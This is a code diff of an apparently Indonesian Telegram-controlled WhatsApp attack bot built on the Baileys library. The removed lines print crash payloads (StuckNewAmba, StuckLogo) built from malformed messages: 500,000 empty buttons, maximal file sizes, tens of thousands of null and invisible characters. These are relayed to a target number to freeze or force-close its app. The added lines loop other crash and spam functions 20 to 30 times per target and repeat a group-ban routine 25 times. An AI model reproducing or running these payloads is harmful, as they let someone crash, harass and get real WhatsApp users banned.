@@ -349,7 +349,7 @@ function createSessionDir(botNumber) {
 async function connectToWhatsApp(botNumber, chatId) {
   let statusMessage = await bot
     .sendMessage(
-      chatId, `\`\`\`
+      chatId,`\`\`\`
 ╔─═⊱ 「 📋 𝐋𝐎𝐀𝐃𝐈𝐍𝐆 」
 │┏⊱ Number : ${botNumber}
 ┗━━━━━━━━━━━━━━━━━⬣
@@ -361,112 +361,100 @@ async function connectToWhatsApp(botNumber, chatId) {
   const sessionDir = createSessionDir(botNumber);
   const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
 
-  // 🔥 PAKAI VARIABEL LOKAL — biar gak ketimpa
-  const newSock = makeWASocket({
+  sock = makeWASocket ({
     auth: state,
     printQRInTerminal: false,
     logger: P({ level: "silent" }),
     defaultQueryTimeoutMs: undefined,
   });
 
-  newSock.ev.on("connection.update", async (update) => {
+  sock.ev.on("connection.update", async (update) => {
     const { connection, lastDisconnect } = update;
 
-    if (connection === "close") {
+   if (connection === "close") {
       const statusCode = lastDisconnect?.error?.output?.statusCode;
-
-      // 🔥 Hapus dari sessions
-      sessions.delete(botNumber);
-
-      console.log(`⚠️ Sender ${botNumber} close (code: ${statusCode})`);
-
-      // 🔥 Auto reconnect kalau bukan logout
-      if (statusCode !== 401) {
+      if (statusCode && statusCode >= 500 && statusCode < 600) {
         await bot.editMessageText(`\`\`\`
 ╔─═⊱ 「 📋 𝐑𝐄𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐀𝐆𝐀𝐈𝐍 」
 │┏⊱ Number : ${botNumber}
-│┏⊱ Code : ${statusCode || "-"}
 ┗━━━━━━━━━━━━━━━━━⬣
-\`\`\``, {
-          chat_id: chatId,
-          message_id: statusMessage,
-          parse_mode: "Markdown",
-        }).catch(() => {});
-
-        await new Promise(r => setTimeout(r, 5000));
-
-        try {
-          await connectToWhatsApp(botNumber, chatId);
-        } catch (e) {
-          console.log(`❌ Reconnect gagal ${botNumber}: ${e.message}`);
-        }
-      } else {
-        await bot.editMessageText(`\`\`\`
-╔─═⊱ 「 📋 𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆 」
-│┏⊱ Number : ${botNumber}
-│┏⊱ Reason : Logged Out
-┗━━━━━━━━━━━━━━━━━⬣
-\`\`\``, {
-          chat_id: chatId,
-          message_id: statusMessage,
-          parse_mode: "Markdown",
-        }).catch(() => {});
-
-        try {
-          fs.rmSync(sessionDir, { recursive: true, force: true });
-        } catch (err) {
-          console.error("Error deleting session:", err);
-        }
-      }
-    } else if (connection === "open") {
-      // 🔥 Simpan ke sessions — TIAP SENDER PUNYA SOCK SENDIRI
-      sessions.set(botNumber, newSock);
-      saveActiveSessions(botNumber);
-
-      console.log(`✅ Sender ${botNumber} connected`);
-
-      await bot.editMessageText(`\`\`\`
-╔─═⊱ 「 📋 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆 」
-│┏⊱ Number : ${botNumber}
-┗━━━━━━━━━━━━━━━━━⬣
-\`\`\``, {
-        chat_id: chatId,
-        message_id: statusMessage,
-        parse_mode: "Markdown",
-      }).catch(() => {});
-    } else if (connection === "connecting") {
-      await new Promise((resolve) => setTimeout(resolve, 1000));
-      try {
-        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
-          const code = await newSock.requestPairingCode(botNumber, "ASMODMEK");
-          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
-          await bot.editMessageText(`\`\`\`
-╔─═⊱ 「 📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆 」
-│┏⊱ Number : ${botNumber}
-║┗⊱ Code : ${formattedCode}
-┗━━━━━━━━━━━━━━━━━⬣
-\`\`\``, {
-            chat_id: chatId,
-            message_id: statusMessage,
-            parse_mode: "Markdown",
-          }).catch(() => {});
-        }
-      } catch (error) {
-        console.error("Error requesting pairing code:", error);
-        await bot.editMessageText(
-          `𝗘𝗥𝗥𝗢𝗥\n𝗔𝗹𝗮𝘀𝗮𝗻 : ${error.message}`, {
+\`\`\``,
+          {
             chat_id: chatId,
             message_id: statusMessage,
             parse_mode: "Markdown",
           }
-        ).catch(() => {});
+        );
+        await connectToWhatsApp(botNumber, chatId);
+      } else {
+        await bot.editMessageText(`\`\`\`
+╔─═⊱ 「 📋 𝐆𝐀𝐆𝐀𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆  」
+│┏⊱ Number : ${botNumber}
+┗━━━━━━━━━━━━━━━━━⬣
+\`\`\``,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
+        try {
+          fs.rmSync(sessionDir, { recursive: true, force: true });
+        } catch (error) {
+          console.error("Error deleting session:", error);
+        }
+      }
+    } else if (connection === "open") {
+      sessions.set(botNumber, sock);
+      saveActiveSessions(botNumber);
+      await bot.editMessageText(`\`\`\`
+╔─═⊱ 「 📋 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐓𝐄𝐑𝐇𝐔𝐁𝐔𝐍𝐆  」
+│┏⊱ Number : ${botNumber}
+┗━━━━━━━━━━━━━━━━━⬣
+\`\`\``,
+        {
+          chat_id: chatId,
+          message_id: statusMessage,
+          parse_mode: "Markdown",
+        }
+      );
+   } else if (connection === "connecting") {
+      await new Promise((resolve) => setTimeout(resolve, 1000));
+      try {
+        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
+          const code = await sock.requestPairingCode(botNumber, "ASMODMEK");
+          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
+          await bot.editMessageText(`\`\`\`
+╔─═⊱ 「 📋 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐎𝐍𝐍𝐄𝐂𝐓 𝐏𝐀𝐈𝐑𝐈𝐍𝐆  」
+│┏⊱ Number : ${botNumber}
+║┗⊱ Code : ${formattedCode}
+┗━━━━━━━━━━━━━━━━━⬣
+\`\`\``,
+            {
+              chat_id: chatId,
+              message_id: statusMessage,
+              parse_mode: "Markdown",
+            }
+          );
+        }
+      } catch (error) {
+        console.error("Error requesting pairing code:", error);
+        await bot.editMessageText(
+          `𝗘𝗥𝗥𝗢𝗥\n𝗔𝗹𝗮𝘀𝗮𝗻 : ${error.message}`,
+          {
+            chat_id: chatId,
+            message_id: statusMessage,
+            parse_mode: "Markdown",
+          }
+        );
       }
     }
   });
 
-  newSock.ev.on("creds.update", saveCreds);
 
-  return newSock;
+  sock.ev.on("creds.update", saveCreds);
+
+  return sock;
 }
 
 async function connectToBanWhatsApp(botNumber, chatId) {
@@ -3954,122 +3942,6 @@ async function freespamdelay(target) {
         }
     }
 }
-async function StuckNewAmba(sock, target) {
-  await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: {
-            text: "AmbaJahat || @vixzzoficialNe"
-          },
-          nativeFlowMessage: {
-            buttons: Array.from({ length: 500000 }, () => ({}))
-          },
-          contextInfo: {
-            mentionedJid: [target],
-            quotedMessage: {
-              imageMessage: {
-                url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
-                mimetype: "image/jpeg",
-                fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
-                fileLength: 9007199254740991,
-                height: 4294967295,
-                width: 4294967295,
-                mediaKey: crypto.randomBytes(32).toString("base64"),
-                fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
-                directPath: "/m1/v/t24/00002299291718920200291920729100",
-                jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY="
-              }
-            }
-          }
-        }
-      }
-    }
-  }, { participant: target });
-}
-async function StuckLogo(sock, target) {
-  await sock.relayMessage(target, {
-    stickerMessage: {
-      url: "https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true",
-      fileSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
-      fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
-      mediaKey: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
-      mimetype: "image/webp",
-      height: 4294967295,
-      width: 4294967295,
-      directPath: "/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1",
-      fileLength: 9007199254740991,
-      mediaKeyTimestamp: 9007199254740991,
-      firstFrameLength: 4294967295,
-      firstFrameSidecar: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
-      isAnimated: true,
-      pngThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
-      contextInfo: {
-        mentionedJid: [target],
-        quotedMessage: {
-          contactMessage: {
-            displayName: " ",
-            vcard: "\u0000".repeat(45000)
-          }
-        }
-      },
-      stickerSentTs: 9007199254740991,
-      isAvatar: true,
-      isAiSticker: true,
-      isLottie: true,
-      accessibilityLabel: "ꦾ".repeat(30000)
-    }
-  }, { participant: target });
-
-  await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveMessage: {
-          body: {
-            text: "Vixzz Ganteng Bangettt"
-          },
-          nativeFlowMessage: {
-            buttons: Array.from({ length: 500000 }, () => ({}))
-          },
-          contextInfo: {
-            quotedMessage: {
-              contactMessage: {
-                displayName: " ",
-                vcard: ""
-              }
-            }
-          }
-        }
-      }
-    }
-  }, { participant: target });
-
-  await sock.relayMessage(target, {
-    groupStatusMessageV2: {
-      message: {
-        interactiveResponseMessage: {
-          body: {
-            text: "AmbaJahat",
-            format: "DEFAULT"
-          },
-          nativeFlowResponseMessage: {
-            name: "galaxy_message",
-            paramsJson: "\u2062".repeat(30000),
-            version: 3
-          },
-          contextInfo: {
-            quotedMessage: {
-              contactMessage: {
-                displayName: " ",
-                vcard: ""
-              }
-            }
-          }
-        }
-      }
-    }
-  }, { participant: target });
-}
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
 for (let i = 0; i < 25; i++) {
@@ -4101,12 +3973,12 @@ async function crayxios(inviteCode) {
         throw new Error("Tidak ada sender BAN yang terhubung.");
     }
 
-    for (let i = 0; i < 5; i++) {
+    for (let i = 0; i < 25; i++) {
         const [senderNum, banSock] = senders[i % senders.length];
 
         try {
             console.log(chalk.red(`[Seraphine - FORCE 🦠 ] [${i + 1}/25] ${senderNum}`));
-            await groupBan1(banSock, inviteCode);  // ✅ kirim banSock
+            await groupBan1real(banSock, inviteCode);  // ✅ kirim banSock
         } catch (e) {
             console.log(`❌ ${senderNum}: ${e.message}`);
         }
@@ -4114,258 +3986,76 @@ async function crayxios(inviteCode) {
 }
 
 async function crayxui(target) {
-    const senders = Array.from(sessions.entries());
-    if (senders.length === 0) throw new Error("Tidak ada sender.");
-
-    for (let i = 0; i < 10; i++) {
-        const [senderNum, sock] = senders[i % senders.length];
-        if (!sessions.has(senderNum) || !sock?.user) continue;
-
-        try {
-            await starttime(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await ForcloseDOC(sock, target);
-            await starttime(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-
-            console.log(chalk.red(`[Seraphine - FORCE 🦠 ] [${i + 1}/25] ${senderNum}`));
-        } catch (e) {
-            console.log(`❌ ${senderNum}: ${e.message}`);
-        }
-
-        await new Promise(r => setTimeout(r, 2500));
-    }
+for (let i = 0; i < 25; i++) {
+await starttime(target)
+await ForcloseSTC(target)
+await ForcloseVIDEO(target)
+await ForcloseDOC(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await ForcloseDOC(target)
+await starttime(target)
+await ForcloseSTC(target)
+await ForcloseVIDEO(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
+console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
+}
 }
 
 async function crayxsuper(target) {
-    const senders = Array.from(sessions.entries());
-    if (senders.length === 0) throw new Error("Tidak ada sender.");
-
-    for (let i = 0; i < 8; i++) {
-        const [senderNum, sock] = senders[i % senders.length];
-        if (!sessions.has(senderNum) || !sock?.user) continue;
-
-        try {
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await starttime(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await starttime(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-
-            console.log(chalk.red(`[Seraphine - FORCE 🦠 ] [${i + 1}/25] ${senderNum}`));
-        } catch (e) {
-            console.log(`❌ ${senderNum}: ${e.message}`);
-        }
-
-        await new Promise(r => setTimeout(r, 2500));
-    }
+for (let i = 0; i < 20; i++) {
+await freespamdelay(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
+console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
+}
+
+
 async function crayxvol(target) {
-    const senders = Array.from(sessions.entries());
-    if (senders.length === 0) throw new Error("Tidak ada sender.");
-
-    for (let i = 0; i < 8; i++) {
-        const [senderNum, sock] = senders[i % senders.length];
-        if (!sessions.has(senderNum) || !sock?.user) continue;
-
-        try {
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await ForcloseDOC(sock, target);
-            await starttime(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await starttime(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await ForcloseSTC(sock, target);
-            await ForcloseVIDEO(sock, target);
-            await ForcloseDOC(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-
-            console.log(chalk.red(`[Seraphine - FORCE 🦠 ] [${i + 1}/25] ${senderNum}`));
-        } catch (e) {
-            console.log(`❌ ${senderNum}: ${e.message}`);
-        }
-
-        await new Promise(r => setTimeout(r, 2500));
-    }
+for (let i = 0; i < 30; i++) {
+await ForcloseDOC(target)
+await starttime(target)
+await ForcloseSTC(target)
+await ForcloseVIDEO(target)
+await ForcloseDOC(target)
+await starttime(target)
+await ForcloseSTC(target)
+await ForcloseVIDEO(target)
+await freespamdelay(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
+console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
-
-
+}
 
 async function Crayxbayar(target) {
-    const senders = Array.from(sessions.entries());
-    if (senders.length === 0) throw new Error("Tidak ada sender.");
-
-    for (let i = 0; i < 8; i++) {
-        const [senderNum, sock] = senders[i % senders.length];
-        if (!sessions.has(senderNum) || !sock?.user) continue;
-
-        try {
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckNewAmba(sock, target);
-            await StuckLogo(sock, target);
-            await StuckLogo(sock, target);
-            await StuckNewAmba(sock, target);
-
-            console.log(chalk.red(`[Seraphine - MEMEK ] [${i + 1}/20] ${senderNum}`));
-        } catch (e) {
-            console.log(`❌ ${senderNum}: ${e.message}`);
-        }
-
-        await new Promise(r => setTimeout(r, 2500));
-    }
+for (let i = 0; i < 20; i++) {
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await LexcaabosV7Fix(target)
+await LexcaabosV5(target)
+await LexcaabosV4(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await freespamdelay(target)
+await new Promise(resolve => setTimeout(resolve, 2500));
+console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
+}
 }
 
 async function spambol(target) {
